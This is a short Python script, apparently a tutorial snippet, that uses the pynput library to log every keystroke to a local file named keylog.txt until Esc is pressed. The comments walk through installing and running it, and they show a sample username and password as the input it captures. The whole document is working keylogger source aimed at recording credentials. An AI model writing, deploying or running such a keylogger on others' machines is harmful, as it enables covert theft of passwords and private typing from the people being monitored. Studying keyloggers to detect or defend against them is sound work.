from pynput import keyboard
#Make Sure to install this Pynput Library
#Open Terminal and paste this command "pip install pynput"

def on_press(key):
    try:
        with open("keylog.txt", "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        with open("keylog.txt", "a") as log_file:
            log_file.write(f" {key} ")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

#Run this program
#This will start capturing keystrokes
#For Example I am giving a sample credential

# UserName = Admin
# Passwd = RootIsThePaswwrod

# Now click esc to exit this program

#-----------------------------------------
#It will generate a keylog file in given path
#Now the keystrokes are captured in the keylog.txt file
#---------------------------------------------
#Replace all these with Spaces
#key.enter
#key.space
#key.shift
